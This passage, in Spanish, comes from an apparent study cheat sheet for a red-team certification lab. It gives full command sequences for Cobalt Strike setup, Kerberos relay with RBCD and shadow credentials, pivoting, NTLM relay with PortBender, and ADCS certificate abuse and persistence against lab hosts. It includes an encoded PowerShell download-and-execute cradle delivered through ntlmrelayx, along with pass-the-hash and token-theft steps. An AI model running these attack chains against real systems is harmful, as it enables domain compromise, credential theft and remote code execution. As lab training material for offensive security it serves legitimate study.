# 5. Editar el servicio para apuntar al nuevo profile
cd /etc/systemd/system/
sudo nano teamserver.service

# 6. Modificar el servicio para que apunte al nuevo profile
# ExecStart=/home/attacker/cobaltstrike/teamserver 10.10.5.50 Passw0rd! c2-profiles/normal/crto.profile

# 7. Reiniciar el servicio
sudo systemctl daemon-reload
sudo systemctl start teamserver.service
sudo systemctl status teamserver.service
```

`También debes recordar reiniciar el team server y regenerar tus payloads después de realizar cambios en el perfil de Malleable C2.`

## Import BOF (SCMUACBypass)
```r
PS> cd C:\Tools\SCMUACBypass

CobaltStrike > Script Manager > Load
"C:\Tools\SCMUACBypass\scmuacbypass.cna"
```

```r
# Ejemplo de uso
beacon> elevate
svc-exe-krb 		Get SYSTEM via an executable run as a service via Kerberos authentication
```

## Kerberos Relay RBCD 
```r
# Crear una cuenta de computadora falsa para el ataque Kerberos Relay RBCD.

# 1. Importar PowerView.ps1
beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1  

# 2. Verificar si tenemos permiso para crear una cuenta de computadora
beacon> powerpick Get-DomainObject -Identity "DC=dev,DC=cyberbotic,DC=io" -Properties ms-DS-MachineAccountQuota

# 3. Crear una computadora falsa con contraseña aleatoria
# (generar hash usando Rubeus)
beacon> execute-assembly C:\Tools\StandIn\StandIn\StandIn\bin\Release\StandIn.exe --computer EvilComputer --make

# 4. Obtener SID de la computadora falsa
beacon> powerpick Get-DomainComputer -Identity EvilComputer -Properties objectSid

# 5. Encontrar un puerto adecuado para el OXID Resolver
# (evitar chequeo en el RPCSS)
beacon> execute-assembly C:\Tools\KrbRelay\CheckPort\bin\Release\CheckPort.exe

# 6. Ejecutar KrbRelay
beacon> execute-assembly C:\Tools\KrbRelay\KrbRelay\bin\Release\KrbRelay.exe -spn ldap/dc-2.dev.cyberbotic.io -clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8 -rbcd S-1-5-21-569305411-121244042-2357301523-9101 -port 10

# - `-spn` es el servicio objetivo para el relay
# - `-clsid` representa `RPC_C_IMP_LEVEL_IMPERSONATE`
# - `-rbcd` es el SID de la cuenta de computadora falsa
# - `-port` es el puerto devuelto por CheckPort

# 7. Consultar WKSTN-2$ para ver entradas en msDS-AllowedToActOnBehalfOfOtherIdentity
beacon> powershell Get-DomainComputer -Identity wkstn-2 -Properties msDS-AllowedToActOnBehalfOfOtherIdentity

# 8. Obtener el AES256 de EvilComputer
PS> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe hash /password:oIrpupAtF1YCXaw /user:EvilComputer$ /domain:dev.cyberbotic.io

# 9. Solicitar un TGT de EvilComputer con asktgt (usando AES256)
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:EvilComputer$ /aes256:1DE19DC9065CFB29D6F3E034465C56D1AEC3693DB248F04335A98E129281177A /nowrap

# 10. Usar la técnica S4U para solicitar un TGS para el servicio host
# (usando el TGT de EvilComputer)
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:Administrator /user:EvilComputer$ /msdsspn:host/wkstn-2 /ticket:doIF8j[...snip...]MuaW8= /ptt

# 11. Elevar privilegios con el ticket para interactuar con el Service Control Manager
# (crear e iniciar un payload binario de servicio)
beacon> elevate svc-exe-krb tcp-local
```

## Kerberos Relay Shadow Credentials
La ventaja de usar shadow credentials sobre RBCD es que no necesitamos agregar una computadora falsa al dominio.
```r
# Shadow Credentials con KrbRelay y Rubeus

# 1. Verificar que WKSTN-2 no tenga nada en su atributo `msDS-KeyCredentialLink`
beacon> execute-assembly C:\Tools\Whisker\Whisker\bin\Release\Whisker.exe list /target:wkstn-2$

# 2. Ejecutar KrbRelay con el parámetro -shadowcred
beacon> execute-assembly C:\Tools\KrbRelay\KrbRelay\bin\Release\KrbRelay.exe -spn ldap/dc-2.dev.cyberbotic.io -clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8 -shadowcred -port 10

# - `-spn` es el servicio objetivo para el relay
# - `-clsid` representa `RPC_C_IMP_LEVEL_IMPERSONATE`
# - `-shadowcred` indica el uso de Shadow Credentials
# - `-port` es el puerto devuelto por CheckPort

# 3.1. Solicitar un TGT para WKSTN-2 en RC4 (comando generado por KrbRelay)
Rubeus.exe asktgt /user:WKSTN-2$ /certificate:MIIJyA<SNIPPED>ECAgfQ /password:"7faf0673-f9b2-4aef-8bd4-c3c4df53ea12" /getcredentials /show

# 3.2. Alternativamente, solicitar un TGT con encriptación AES256
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:WKSTN-2$ /certificate:MIIJyA[...snip...]QCAgfQ /password:"7faf0673-f9b2-4aef-8bd4-c3c4df53ea12" /enctype:aes256 /nowrap

# 4. Usar la técnica S4U para solicitar un TGS para el servicio host
# (usando el TGT generado con las Shadow Credentials)
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:Administrator /self /altservice:host/wkstn-2 /user:wkstn-2$ /ticket:doIGkD[...snip...]5pbw== /ptt

# 5. Elevar privilegios con el ticket
# (interactuar con el Service Control Manager local para crear e iniciar un payload binario de servicio)
beacon> elevate svc-exe-krb tcp-local
```

---
# Pivoting
```r
|------------------------|-----------------|
| Host                   | IP Address      |
|------------------------|-----------------|
| Attacker Desktop       | 10.10.5.40      |
| Attacker Desktop (WSL) | 10.10.5.40      |
| Attacker Linux (Ubuntu)| 10.10.5.50      |
| Workstation 2          | 10.10.123.102   |
| Workstation 1          | 10.10.123.101   |
| Web Server             | 10.10.122.30    |
| Studio DC              | 10.10.150.10    |
| Squid Proxy            | 10.10.122.254   |
| SQL Server 2           | 10.10.122.25    |
| SQL Server 1           | 10.10.120.25    |
| SCM Server 1           | 10.10.120.30    |
| Power DNS              | 10.10.5.250     |
| MSP DC                 | 10.10.151.10    |
| File Share             | 10.10.122.15    |
| Exchange Server        | 10.10.120.20    |
| Elastic Stack          | 10.10.120.100   |
| Domain Controller 2    | 10.10.122.10    |
| Domain Controller 1    | 10.10.120.10    |
|------------------------|-----------------|
```

## SOCKS + Proxychains
```r
# 1. Habilitar Socks Proxy en la sesión de beacon (Usar SOCKS 5 para mejor OPSEC)
beacon> socks 1080 socks5 disableNoAuth 3ky 3kyRoad2CRTO enableLogging

# 2. Verificar el SOCKS proxy en el team server
attacker@ubuntu > sudo ss -lpnt

# 3. Configurar Proxychains en Linux
attacker@ubuntu > sudo nano /etc/proxychains.conf
socks5 127.0.0.1 1080 3ky 3kyRoad2CRTO

# 4. Configurar Proxychains en WSL
ubuntu@DESKTOP-3BSK7NO > sudo nano /etc/proxychains.conf
socks5 10.10.5.50 1080 3ky 3kyRoad2CRTO

# 4. Ejemplo con Attacker Linux (Ubuntu)
attacker@ubuntu > proxychains nmap -n -Pn -sT -p445,3389,4444,5985 10.10.122.10

# 5. Ejemplo con Attacker Desktop (WSL)
ubuntu@DESKTOP-3BSK7NO > proxychains wmiexec.py DEV/jking@10.10.122.30
Qwerty123
```

## SOCKS + Kerberos
```r
# 1. Solicitar un TGT para `jking` usando su hash AES256 
# mimikatz !sekurlsa::ekeys
ubuntu@DESKTOP-3BSK7NO > proxychains getTGT.py -dc-ip 10.10.122.10 -aesKey 4a8a74daad837ae09e9ecc8c2f1b89f960188cb934db6d4bbebade8318ae57c6 dev.cyberbotic.io/jking

# 2. Crear una variable de entorno `KRB5CCNAME` que apunte al archivo ccache generado
ubuntu@DESKTOP-3BSK7NO > export KRB5CCNAME=jking.ccache

# 3. Ejecutar impacket-psexec para obtener un shell SYSTEM en WEB
ubuntu@DESKTOP-3BSK7NO > proxychains psexec.py -dc-ip 10.10.122.10 -target-ip 10.10.122.30 -no-pass -k dev.cyberbotic.io/jking@web.dev.cyberbotic.io
```

```r
# 1. Si tienes un ticket en formato `kirbi`, conviértelo a `ccache` para usarlo con impacket.
beacon> getuid
[*] You are DEV\bfarmer

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe tgtdeleg /nowrap
doIFzj[...snip...]MuSU8=

# 2. Decodificar en Base64 el ticket y guardarlo como `bfarmer.kirbi`.
ubuntu@DESKTOP-3BSK7NO > echo -en 'doIFzj[...snip...]MuSU8=' | base64 -d > bfarmer.kirbi

# 3. Convertir el ticket al formato `ccache` usando impacket-ticketConverter.
ubuntu@DESKTOP-3BSK7NO > ticketConverter.py bfarmer.kirbi bfarmer.ccache

# 4. Crear una variable de entorno `KRB5CCNAME` que apunte al archivo ccache generado
ubuntu@DESKTOP-3BSK7NO > export KRB5CCNAME=bfarmer.ccache

# 5. Usar el TGT convertido para interactuar con el servicio SQL-2.
ubuntu@DESKTOP-3BSK7NO > proxychains mssqlclient.py -dc-ip 10.10.122.10 -no-pass -k dev.cyberbotic.io/bfarmer@sql-2.dev.cyberbotic.io

# NOTA: Agrega una entrada estática de host en `/etc/hosts` y habilita `remote_dns` en `/etc/proxychains.conf` si es necesario.
ubuntu@DESKTOP-3BSK7NO > sudo nano /etc/proxychains.conf
# Cambiar proxy_dns -por-> remote_dns

ubuntu@DESKTOP-3BSK7NO > sudo nano /etc/hosts
# Agregar 10.10.122.25 sql-2.dev.cyberbotic.io

```

## Proxifier
```r
# 1. Ejecutar Proxifier como Administrador.

# 2. Crear una nueva entrada de proxy.
Open Proxifier > Profile > Proxy Servers > Add

# 3. Ingresar los parámetros del Proxy Server.
[Referencia: https://files.cdn.thinkific.com/file_uploads/584845/images/871/92c/d2e/proxy-server.png]

# Default proxy -> No
# Update rules -> Yes -> Add

# 4. Configurar qué aplicaciones deben usar el proxy y bajo qué condiciones.
[Referencia: https://files.cdn.thinkific.com/file_uploads/584845/images/37a/06d/29b/proxy-rules.png]

# 5. Configurar reglas para dominios si el tráfico de Kerberos debe ser proxificado.
# Proxifier no hará proxy del tráfico de Kerberos a menos que los dominios estén configurados explícitamente.
[Referencia: https://files.cdn.thinkific.com/file_uploads/584845/images/433/8d7/81a/target-hosts.png]
```

### Proxifier examples
```r
# 1. Usar Proxifier en entornos Windows.

# 2. Ejemplo con runas. (Abrir CMD.exe como Administrador*)
PS > runas /netonly /user:dev/bfarmer mmc.exe

# 3. Ejemplo con mimikatz.
PS > mimikatz # privilege::debug
PS > mimikatz # sekurlsa::pth /domain:DEV /user:bfarmer /ntlm:4ea24377a53e67e78b2bd853974420fc /run:mmc.exe

# 4. Ejemplo con PowerShell.
PS C:\Users\Attacker> $cred = Get-Credential
PS C:\Users\Attacker> Get-ADComputer -Server 10.10.122.10 -Filter * -Credential $cred | select
```

### Launch HeidiSQL through Proxifier
```r
# 1. Generar un TGS para el servicio MSSQLSvc usando el TGT de bfarmer (obtenido previamente).
PS C:\Windows\system32> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /ticket:doIFzj[...snip...]MuSU8= /service:MSSQLSvc/sql-2.dev.cyberbotic.io:1433 /dc:dc-2.dev.cyberbotic.io /ptt

# 2. Lanzar HeidiSQL desde la misma ventana de PowerShell.
PS C:\Windows\system32> C:\Tools\HeidiSQL\heidisql.exe

# 3. Configurar el nombre del host objetivo como `sql-2.dev.cyberbotic.io` y conectarse.
[Referencia: https://files.cdn.thinkific.com/file_uploads/584845/images/607/fd7/b78/heidi.png]

[Referencia:
https://pub-1041bb23829741158103300e5eeabcee.r2.dev/Files/heidi.png]
```

## Browser Proxy with FoxyProxy
```r
# 1. Configurar la extensión de FoxyProxy según la referencia.
[Referencia: https://files.cdn.thinkific.com/file_uploads/584845/images/3e5/73f/7fd/foxy-proxy.png]

# 2. Navegar al servidor web interno: `10.10.122.30`.
[Referencia: https://files.cdn.thinkific.com/file_uploads/584845/images/797/345/0f5/iis.png]
```

## Reverse Port Forwards
```r
# Ejemplo en Laboratorio
# DC-2 no tienen acceso al teamserver
PS C:\Users\Administrator> hostname
dc-2

PS C:\Users\Administrator> iwr -Uri http://nickelviper.com/a
iwr : Unable to connect to the remote server
```

```r
# 1. Configurar un Reverse Port Forward para redirigir el tráfico si el teamserver no es directamente accesible.
# Cuando la máquina X se conecte al puerto 8080 de WKSTN-2 -se redirigirá-> puerto 80 del teamserver
beacon> rportfwd 8080 127.0.0.1 80

# 2. Verificar que el puerto esté escuchando usando netstat.
beacon> run netstat -anp tcp
  TCP    0.0.0.0:8080           0.0.0.0:0              LISTENING
beacon> shell hostname

# 3. Probar la redirección con PowerShell.
PS > iwr -Uri http://wkstn-2:8080/a
PS > iwr -Uri http://10.10.123.102:8080/a

# 4. Crear una regla de firewall para permitir tráfico en el puerto 8080. 
# Requiere un usuario con privilegios escalados
beacon> powershell New-NetFirewallRule -DisplayName "8080-In" -Profile Domain -Direction Inbound -Action Allow -Protocol TCP -LocalPort 8080

# 5. Eliminar la regla de firewall cuando ya no sea necesaria.
beacon> powershell Remove-NetFirewallRule -DisplayName "8080-In"
```

## NTLM Relay
```r
# Configuración de redirección de puertos y tráfico SMB para NTLMRelay

# 1. Obtener un beacon SYSTEM en la máquina donde se capturará el tráfico SMB.
# En el laboratorio se usa WKSTN-2 (BFARMER->SYSTEM)

# 2. Crear reglas de firewall para permitir tráfico en los puertos 8080 y 8445.
beacon> powershell New-NetFirewallRule -DisplayName "8445-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8445
beacon> powershell New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080

# 3. Configurar redirección de puertos inversa (reverse port forwarding).
# Cuando la máquina X se conecte al puerto 8080 -se redirigirá-> puerto 80
# Cuando la máquina X se conecte al puerto 8445 -se redirigirá-> puerto 445
beacon> rportfwd 8080 127.0.0.1 80
beacon> rportfwd 8445 127.0.0.1 445

# 10.10.123.102:8080 -> 10.10.5.50:80
# 10.10.123.102:8445 -> 10.10.5.50:445

# 4. Configurar Proxychains para usar este proxy.
attacker@ubuntu > sudo nano /etc/proxychains.conf
socks5 127.0.0.1 1080 socks_user socks_password

# 5. Configurar un SOCKS Proxy en el beacon.
beacon> socks 1080 socks5 disableNoAuth socks_user socks_password enableLogging

# 6. Usar Proxychains para enviar tráfico NTLMRelay al beacon apuntando al DC y ejecutar un payload SMB codificado.
# 10.10.122.10 es la IP de `dc-2.dev.cyberbotic.io`, que es el objetivo.
attacker@ubuntu > sudo proxychains ntlmrelayx.py -t smb://10.10.122.10 -smb2support --no-http-server --no-wcf-server -c 'powershell -nop -w hidden -enc SQBFAFgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAyADMALgAxADAAMgA6ADgAMAA4ADAALwBiACIAKQA='

#Attacks -> Scripted Web Delivery (S) 
#[Referencia: https://pub-1041bb23829741158103300e5eeabcee.r2.dev/Files/listener.png]

# Output:
# IEX ((new-object net.webclient).downloadstring('http://10.10.5.50:80/b'))

# Modificarlo a:
# IEX (new-object net.webclient).downloadstring("http://10.10.123.102:8080/b")

# Base64: SQBFAFgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAyADMALgAxADAAMgA6ADgAMAA4ADAALwBiACIAKQA=

# 7. Subir el driver de PortBender y cargar su archivo.
beacon> cd C:\Windows\system32\drivers
beacon> upload C:\Tools\PortBender\WinDivert64.sys

# Luego ir a Cobalt Strike > Script Manager y cargar `PortBender.cna` desde `C:\Tools\PortBender`

# 8. Ejecutar PortBender para redirigir el tráfico desde el puerto 445 al puerto 8445.
beacon> PortBender redirect 445 8445

# 9. Acceder manualmente al recurso compartido en nuestro sistema o usar MSPRN o Printspooler para forzar la autenticación.
# Por ejemplo, accede a WKSTN-1 como el usuario nlamb. Este usuario es administrador de dominio:
C:\Users\nlamb> hostname
wkstn-1
C:\Users\nlamb> dir \\10.10.123.102\relayme

# 10. Verificar el acceso en los web logs y usar el comando link para conectar con el SMB beacon.
beacon> link dc-2.dev.cyberbotic.io TSVCPIPE-89dd8075-89e1-4dc8-aeab-dde50401337

# 11. Para detener PortBender, detener el job y matar el proceso generado.
beacon> jobs
[*] Jobs

 JID  PID   Description
 ---  ---   -----------
 2    5740  PortBender

beacon> jobkill 2
beacon> kill 5740
```

### NTLM Relay tricks
```r
# 1. Utilizar una imagen 1x1 enviada por email para forzar la autenticación NTLM.
# Incluir una referencia SMB en el atributo `src` para capturar hashes NTLM.
<img src="\\10.10.123.102\test.ico" height="1" width="1" />

# 2. Crear un Windows Shortcut (LNK) apuntando a un recurso SMB para forzar la autenticación NTLM.
$wsh = new-object -ComObject wscript.shell
$shortcut = $wsh.CreateShortcut("\\dc-2\software\test.lnk")
$shortcut.IconLocation = "\\10.10.123.102\test.ico"
$shortcut.Save()

# 3. Utilizar herramientas específicas para desencadenar autenticaciones NTLM automáticamente:
# - SpoolSample: Explota la vulnerabilidad PrintSpooler para forzar autenticaciones NTLM.
# - SharpSystemTriggers: Herramienta para invocar autenticaciones remotas en sistemas Windows.
# - PetitPotam: Utiliza el protocolo MS-EFSRPC para desencadenar autenticaciones NTLM en un servidor remoto.
```

## Relaying WebDAV + RBCD
```r
# Relaying WebDAV + RBCD (Resource-Based Constrained Delegation)

# 1. Verificar el estado del servicio WebClient en los objetivos.
beacon> run sc qc WebClient

# 2. Utilizar GetWebDAVStatus para verificar si WebClient está en ejecución.
beacon> inline-execute C:\Tools\GetWebDAVStatus\GetWebDAVStatus_BOF\GetWebDAVStatus_x64.o wkstn-1,wkstn-2

# 3. Crear reglas de firewall para permitir tráfico en el puerto 8888.
beacon> powershell New-NetFirewallRule -DisplayName "8888-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8888

# 4. Configurar redirección de puertos inversa (reverse port forwarding).
beacon> rportfwd 8888 localhost 8888

# 5. Configurar un SOCKS Proxy en el beacon.
beacon> socks 1080 socks5 disableNoAuth 3ky 3kyRoad2CRTO enableLogging

# 6. Iniciar NTLMRelayx con la opción `delegate-access` para habilitar RBCD.
attacker@ubuntu > sudo proxychains ntlmrelayx.py -t ldaps://10.10.122.10 --delegate-access -smb2support --http-port 8888

# 7. Utilizar `SharpSystemTriggers` para desencadenar la autenticación.
# La URL de WebDAV debe apuntar al reverse port forward configurado.
beacon> execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe wkstn-1 wkstn-2@8888/pwnnet

# 8. Calcular el hash AES256 para la cuenta creada o modificada.
PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe hash /domain:dev.cyberbotic.io /user:RWRTIKTA$ /password:';s3mupp@INp4a4P'

# 9. Realizar S4U2Proxy para solicitar el TGS del servicio deseado utilizando el TGT generado.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:RWRTIKTA$ /impersonateuser:nlamb /msdsspn:cifs/wkstn-1.dev.cyberbotic.io /aes256:0C1C711155847B96496D4630389F07DE423F08F20EB010B6B783FC77497EF329 /nowrap

# 10. Inyectar el S4U2Proxy ticket generado en el paso anterior.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIGfj<SNIPPED>y5pbw==

# 11. Acceder al servicio utilizando el ticket inyectado.
beacon> steal_token 1872
beacon> ls \\wkstn-1.dev.cyberbotic.io\c$
[*] Listing: \\wkstn-1.dev.cyberbotic.io\c$\

# 12. (OPSEC) Eliminar la cuenta de computadora falsa para limpiar rastros.
# Esto es especialmente importante después de un ataque RBCD.
```

## Relaying WebDAV + Shadow Credentials
```r
# Relaying WebDAV + Shadow Credentials

# 1. Verificar el estado del servicio WebClient.
C:\Users\bfarmer>sc qc WebClient

# 2. Utilizar GetWebDAVStatus para verificar si WebClient está en ejecución en los objetivos.
beacon> inline-execute C:\Tools\GetWebDAVStatus\GetWebDAVStatus_BOF\GetWebDAVStatus_x64.o wkstn-1,wkstn-2

# 3. Crear reglas de firewall para permitir tráfico en el puerto 8888.
beacon> powershell New-NetFirewallRule -DisplayName "8888-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8888

# 4. Configurar redirección de puertos inversa (reverse port forwarding) en el puerto 8888.
beacon> rportfwd 8888 localhost 8888

# 5. Generar un archivo de certificado usando NTLMRelayx con la opción `shadow`.
attacker@ubuntu > sudo proxychains ntlmrelayx.py -t ldaps://10.10.122.10 --shadow-credentials -smb2support --http-port 8888

# 6. Utilizar `SharpSystemTriggers` para desencadenar la autenticación mediante WebDAV.
# La URL debe apuntar al reverse port forward configurado.
beacon> execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe wkstn-1 wkstn-2@8888/pwnnet

# 7. Convertir el certificado obtenido al formato `ccache` o codificarlo en `base64` para usar con Rubeus.
attacker@ubuntu > cat P8twTOyE.pfx | base64 -w 0

# 8. Solicitar un TGT utilizando Rubeus con el certificado generado.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:WKSTN-1$ /enctype:aes256 /certificate:MIII3Q<SNIPPED>KCGz+HA= /password:ZeSHAniN7pc6i3QhuBHv /nowrap

# 9. Usar la técnica S4U para obtener un TGS del sistema objetivo utilizando el TGT.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /self /altservice:cifs/wkstn-1.dev.cyberbotic.io /user:WKSTN-1$ /ticket:doI<CODE SNIPPED>5pbw== /nowrap

# 10. Inyectar el S4U2Proxy ticket generado en el paso anterior.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIF<CODE SNIPPED>WMuaW8=

# 11. Acceder al servicio utilizando el ticket inyectado.
beacon> steal_token 19524
beacon> ls \\wkstn-1.dev.cyberbotic.io\c$
[*] Listing: \\wkstn-1.dev.cyberbotic.io\c$\
```

---
# Active Directory Certificate Services

## Finding Certificate Authorities
```r
# Enumerar las Autoridades Certificadoras (Certificate Authorities) en el entorno.
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe cas
```
## Misconfigured Certificate Templates
```r
# Buscar plantillas de certificados mal configuradas que puedan ser explotadas.
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe find /vulnerable+
```

## Vulnerable User Template - Case: _ENROLLEE_SUPPLIES_SUBJECT_
```r
[Referencia: https://files.cdn.thinkific.com/file_uploads/584845/images/d7e/9d6/306/customuser.png]

#1. Este template es servido por `dc-2.dev.cyberbotic.io\sub-ca`.
#2. El template se llama `CustomUser`.
#3. `ENROLLEE_SUPPLIES_SUBJECT` está habilitado, lo que permite al solicitante del certificado proporcionar cualquier SAN (subject alternative name).
#4. El uso del certificado tiene configurado `Client Authentication`.
#5. `DEV\Domain Users` tienen derechos de inscripción, por lo que cualquier usuario de dominio puede solicitar un certificado desde esta plantilla.

# 1. Esta configuración permite que cualquier Domain User solicite un certificado para cualquier otro Domain User (incluido un Domain Admin).
beacon> getuid
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-2.dev.cyberbotic.io\sub-ca /template:CustomUser /altname:nlamb

# 2. Copiar el certificado completo (incluye la clave privada y el certificado) y guardarlo como `cert.pem`.

# 3. Convertir `cert.pem` a `cert.pfx` utilizando OpenSSL.
ubuntu@DESKTOP-3BSK7NO > openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
# (Definir una contraseña, por ejemplo, 3kyRoad2CRTO)

# 4. Convertir `cert.pfx` a Base64 para que sea compatible con Rubeus.
ubuntu@DESKTOP-3BSK7NO > cat cert.pfx | base64 -w 0

# 5. Solicitar un TGT para el usuario objetivo utilizando el certificado.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:nlamb /certificate:MIIM7w[...]ECAggA /password:3kyRoad2CRTO /nowrap

# 6. Inyectar el TGS en un nuevo token sacrificial.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFyD[...]MuaW8=

# 7. Acceder al servicio utilizando el ticket inyectado.
beacon> steal_token 1234
beacon> ls \\web.dev.cyberbotic.io\c$
```

## NTLMRelay to ADCS HTTP Endpoints

```r
# Relaying NTLM a Endpoints HTTP de ADCS
#- El endpoint web para los servicios de certificados se encuentra en http[s]://<hostname>/certsrv.
#- Redirige el tráfico de autenticación NTLM utilizando el ataque PrintSpooler desde el DC hacia el CA (si los servicios están en sistemas separados) para así obtener el certificado del DC.
#- Si el DC y el CA están en el mismo servidor, se puede ejecutar el ataque apuntando a un sistema con delegación no restringida (WEB) y forzarlo a autenticarse con el CA para capturar su certificado.
#- Configura el mismo entorno para ntlmrelayx y utiliza PrintSpooler para forzar al DC/WEB a autenticarse con WKSTN-2


# 1. Habilitar un SOCKS Proxy en la sesión de beacon para enrutar tráfico (mejor OPSEC).
beacon> socks 1080 socks5 disableNoAuth 3ky 3kyRoad2CRTO enableLogging

# 2. Verificar el SOCKS proxy en el team server.
attacker@ubuntu > sudo ss -lpnt

# 3. Configurar Proxychains en Linux para enrutar tráfico a través del proxy.
attacker@ubuntu > sudo nano /etc/proxychains.conf
socks5 127.0.0.1 1080 3ky 3kyRoad2CRTO

# 5. Crear reglas de firewall para permitir tráfico en el puerto 8445.
beacon> powershell New-NetFirewallRule -DisplayName "8445-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8445

# 6. Configurar redirección de puertos inversa (reverse port forwarding).
# Cuando un sistema se conecte al puerto 8445, redirigir el tráfico al puerto 445.
# 10.10.123.102:8445 -> 10.10.5.50:445
beacon> rportfwd 8445 127.0.0.1 445

# 7. Subir el driver de PortBender y cargar su archivo. (Requiere SYSTEM*)
beacon> cd C:\Windows\system32\drivers
beacon> upload C:\Tools\PortBender\WinDivert64.sys
# Luego cargar `PortBender.cna` desde `Cobalt Strike > Script Manager`.

# 8. Configurar PortBender para redirigir el tráfico desde el puerto 445 al puerto 8445.
beacon> PortBender redirect 445 8445

# 9. Ejecutar NTLMRelayx apuntando al endpoint del servidor de certificados.
attacker@ubuntu > sudo proxychains ntlmrelayx.py -t https://10.10.122.10/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# 10. Ejecutar PrintSpooler para forzar autenticaciones hacia el endpoint objetivo.
beacon> execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe 10.10.122.30 10.10.123.102

# 11. Usar el certificado obtenido (en Base64) para solicitar un TGT del equipo objetivo.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:WEB$ /certificate:MIIM7w[...]ECAggA /nowrap

# 12. Utilizar el TGT para un ataque S4U y obtener un service ticket.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /self /altservice:cifs/web.dev.cyberbotic.io /user:WEB$ /ticket:doIFuj[...]lDLklP /nowrap

# 13. Inyectar el Service Ticket creando un token sacrificial.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFyD[...]MuaW8=

# 14. Robar el token e interactuar con el servicio remoto.
beacon> steal_token 1234
beacon> ls \\web.dev.cyberbotic.io\c$
```

## User Persistance

```r
beacon> getuid
[*] You are DEV\nlamb

beacon> run hostname
wkstn-1

# 1. Enumerar certificados del usuario desde su Personal Certiifcate store.
# Este comando debe ejecutarse desde la sesión del usuario.
beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe Certificates

# 2. Exportar el certificado en formato DER y PFX al disco.
beacon> mimikatz crypto::certificates /export

# 3. Codificar el archivo PFX exportado a Base64 para que sea compatible con Rubeus.
ubuntu@DESKTOP-3BSK7NO > cat /mnt/c/Users/Attacker/Desktop/CURRENT_USER_My_0_Nina\ Lamb.pfx | base64 -w 0

# 4. Usar el certificado exportado para solicitar un TGT para el usuario.
# Utilizar `/enctype:aes256` para un mejor OPSEC.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:nlamb /certificate:MIINeg[...]IH0A== /password:mimikatz /enctype:aes256 /nowrap

# 5. Inyectar el Service Ticket creando un token sacrificial.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFyD[...]MuaW8=

# 6. Robar el token e interactuar con el servicio remoto.
beacon> steal_token 1234
beacon> ls \\sql-2.dev.cyberbotic.io\c$

# 7. Si el certificado no está presente, solicitarlo desde su sesión activa y luego seguir los pasos anteriores.
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-2.dev.cyberbotic.io\sub-ca /template:User

```

## Computer Persistance
```r
# 1. Exportar el certificado de la máquina desde el almacén de certificados locales.
